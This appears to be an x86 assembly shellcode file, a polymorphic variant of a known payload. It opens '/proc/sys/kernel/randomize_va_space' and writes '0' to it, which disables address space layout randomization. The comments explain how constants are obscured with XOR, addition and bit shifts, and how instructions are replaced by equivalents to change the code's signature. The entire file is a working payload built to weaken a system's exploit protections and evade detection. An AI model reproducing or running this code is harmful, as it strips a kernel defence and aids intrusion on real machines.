;Author:   evoche
;License:  GPL

global _start

section .text
	
;use this as the program entry point

_start:

	xor eax,eax
	push eax

	;push dword 0x65636170
	mov dword [esp-4], 0x65636170		;from the notes
	
	;push dword 0x735f6176
	mov esi, 0x624e5065					;from the notes
	add esi, 0x11111111
	
	mov dword [esp-8], esi
		
	;push dword 0x5f657a69
	mov edi, 0x7FC86A93					;use a xor to retrieve required value
	xor edi, 0x20AD10FA
	mov dword [esp-12], edi
		
	sub esp, 12

	push dword 0x6d6f646e
	push dword 0x61722f6c
	push dword 0x656e7265
	push dword 0x6b2f7379
	push dword 0x732f636f
				
	;push dword 0x72702f2f
	xor esi, esi						
	mov esi, 0xE4E05E5E					;0xE4E05E5E is 0x72702f2f shifted 1 bit left
	shr esi, 0x1						; shift 1 bit right to retrieve required value
	mov dword [esp-4], esi
	sub esp, 4

	mov ebx,esp
	mov cx,0x2bc
	mov al,0x8
	int 0x80

	mov ebx,eax
	push eax
	mov dx,0x3a30
	push dx
	mov ecx,esp
	
	;xor edx,edx
	cdq									;different way to zero edx

	;inc edx
	mov dl, 0x1							;mov intead of increment

	mov al,0x4
	int 0x80

	mov al,0x6
	int 0x80

	;inc eax
	push byte 1							;push instead of inc
	pop eax
	int 0x80



